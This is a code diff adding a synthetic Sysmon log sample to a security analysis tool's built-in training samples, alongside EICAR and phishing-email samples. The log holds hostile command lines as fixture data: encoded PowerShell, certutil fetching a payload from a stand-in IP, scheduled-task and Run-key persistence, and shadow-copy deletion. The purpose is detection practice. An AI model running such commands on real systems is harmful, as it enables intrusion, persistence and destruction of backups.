@@ -1,17 +1,22 @@
 """Sample files built into SO-CRATES, for the Welcome screen's sample
 buttons that work with no internet access (POST /api/load-sample).
 
-Each sample is generated on request, not shipped as a file: both carry
-the EICAR antivirus test string (the binary sample is just that file),
-and building them here - with the string split in this source - means no
-file in the container image contains the signature for a scanner to flag
-or quarantine. It only exists in full in an analysis directory once
-someone loads a sample.
+Each sample is generated on request, not shipped as a file. The binary
+and email samples carry the EICAR antivirus test string (the binary
+sample is just that file), and building them here - with the string
+split in this source - means no file in the container image contains the
+signature for a scanner to flag or quarantine. It only exists in full in
+an analysis directory once someone loads a sample.
+
+All three use only reserved .example domains and documentation-range IPs
+(RFC 2606, RFC 5737), and tell one story: the email lands, Jordan opens
+the attachment, and the log is what happened on the workstation next.
 
 Samples are byte-for-byte deterministic, so loading one twice reopens the
 same analysis (same MD5) instead of creating another.
 """
 
+import json
 from email.message import EmailMessage
 from email.policy import SMTP
 
@@ -96,9 +101,65 @@ def build_binary_sample():
     return EICAR
 
 
+_SYSMON = {'Channel': 'Microsoft-Windows-Sysmon/Operational', 'Provider_Name': 'Microsoft-Windows-Sysmon',
+           'Computer': 'FIN-WS-0412.corp.example'}
+_WORD = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'
+_POWERSHELL = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
+_CMD = 'C:\\Windows\\System32\\cmd.exe'
+_DROPPED = 'C:\\Users\\Public\\update.exe'
+
+
+def _process(time, pid, image, command_line, parent_pid, parent_image, parent_command_line,
+             user='CORP\\jordan.lee'):
+    """A Sysmon process-creation event (ID 1)."""
+    return dict(_SYSMON, EventID=1, SystemTime=time, ProcessId=pid, Image=image,
+                OriginalFileName=image.rsplit('\\', 1)[-1].upper(), CommandLine=command_line,
+                ParentProcessId=parent_pid, ParentImage=parent_image,
+                ParentCommandLine=parent_command_line, User=user, IntegrityLevel='Medium')
+
+
+def build_log_sample():
+    """Sysmon events, one JSON object per line, from the workstation that
+    opened the sample email's payroll form: Word starts encoded PowerShell,
+    certutil downloads a payload from the email's originating IP, and the
+    payload enumerates the user, persists (scheduled task and Run key) and
+    deletes shadow copies. Built to fire long-standing SigmaHQ rules -
+    18 alerts, high to low, with the built-in ruleset when written."""
+    events = [
+        _process('2026-02-03T08:44:02.118Z', 6120, _WORD,
+                 '"WINWORD.EXE" /n "C:\\Users\\jordan.lee\\Downloads\\Payroll_Adjustment_Form.docm"',
+                 3312, 'C:\\Windows\\explorer.exe', 'C:\\Windows\\Explorer.EXE'),
+        _process('2026-02-03T08:44:19.540Z', 7044, _POWERSHELL,
+                 'powershell.exe -nop -w hidden -enc '
+                 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
+                 6120, _WORD, '"WINWORD.EXE" /n "Payroll_Adjustment_Form.docm"'),
+        _process('2026-02-03T08:44:31.007Z', 7208, 'C:\\Windows\\System32\\certutil.exe',
+                 f'certutil.exe -urlcache -split -f http://203.0.113.66/update.bin {_DROPPED}',
+                 7044, _POWERSHELL, 'powershell.exe -nop -w hidden -enc SQBFAFgA...'),
+        dict(_SYSMON, EventID=3, SystemTime='2026-02-03T08:44:31.412Z', ProcessId=7208,
+             Image='C:\\Windows\\System32\\certutil.exe', User='CORP\\jordan.lee', Protocol='tcp',
+             Initiated='true', SourceIp='10.20.4.12', SourcePort=51733,
+             DestinationIp='203.0.113.66', DestinationPort=80),
+        _process('2026-02-03T08:45:02.690Z', 7390, 'C:\\Windows\\System32\\whoami.exe', 'whoami /all',
+                 7372, _CMD, 'cmd.exe /c whoami /all'),
+        _process('2026-02-03T08:45:20.233Z', 7466, 'C:\\Windows\\System32\\schtasks.exe',
+                 f'schtasks /create /sc onlogon /tn "Payroll Updater" /tr {_DROPPED} /f',
+                 7450, _CMD, 'cmd.exe /c schtasks /create /sc onlogon /tn "Payroll Updater"'),
+        dict(_SYSMON, EventID=13, SystemTime='2026-02-03T08:45:25.871Z', EventType='SetValue',
+             ProcessId=7302, Image=_DROPPED, User='CORP\\jordan.lee',
+             TargetObject='HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Microsoft'
+                          '\\Windows\\CurrentVersion\\Run\\PayrollUpdater',
+             Details=_DROPPED),
+        _process('2026-02-03T08:45:41.059Z', 7584, 'C:\\Windows\\System32\\vssadmin.exe',
+                 'vssadmin.exe delete shadows /all /quiet', 7302, _DROPPED, _DROPPED),
+    ]
+    return ''.join(json.dumps(e, sort_keys=True) + '\n' for e in events).encode()
+
+
 # name -> (filename the analysis is given, builder). The only names
 # POST /api/load-sample accepts.
 SAMPLES = {
     'binary': ('eicar.com', build_binary_sample),
+    'log': ('sample-sysmon-log.json', build_log_sample),
     'email': ('sample-phishing-email.eml', build_email_sample),
 }
